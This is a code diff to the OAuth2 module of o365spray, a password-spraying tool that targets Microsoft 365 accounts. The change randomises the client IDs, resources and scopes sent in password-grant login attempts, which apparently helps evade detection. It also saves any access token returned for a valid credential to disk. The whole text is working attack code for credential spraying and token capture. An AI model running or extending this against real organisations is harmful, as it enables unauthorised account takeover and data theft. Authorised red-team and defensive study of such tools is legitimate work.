@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 
-import time
+import json
 import logging
+import time
+
+from o365spray.core.handlers.sprayer.modules.base import SprayerBase
 from o365spray.core.utils import (
     Defaults,
     Helper,
     text_colors,
 )
-from o365spray.core.handlers.sprayer.modules.base import SprayerBase
 
 
 class SprayModule_oauth2(SprayerBase):
@@ -50,16 +52,16 @@ class SprayModule_oauth2(SprayerBase):
 
             time.sleep(0.250)
 
-            # Resource and client_id must be valid for authentication
+            # Scope, resource, client_id must be valid for authentication
             # to complete
-            # APP: Azure Active Directory PowerShell
+            scope = Helper.get_random_sublist_from_list(Defaults.SCOPES)
             data = {
-                "resource": "https://graph.windows.net",
-                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
+                "resource": Helper.get_random_element_from_list(Defaults.RESOURCES),
+                "client_id": Helper.get_random_element_from_list(Defaults.CLIENT_IDS),
                 "grant_type": "password",
                 "username": email,
                 "password": password,
-                "scope": "openid",
+                "scope": " ".join(scope),
             }
 
             # Handle FireProx API URL
@@ -94,6 +96,16 @@ class SprayModule_oauth2(SprayerBase):
                 )
                 # Remove valid user from being sprayed again
                 self.userlist.remove(user)
+
+                # If a token was returned, attempt to write the token
+                # to disk for future use
+                try:
+                    token_file = f"{self.output_dir}{email}.token.json"
+                    with open(token_file, "w") as f:
+                        json.dump(response.json(), f)
+
+                except:
+                    pass
 
             else:
                 # Handle Microsoft AADSTS errors
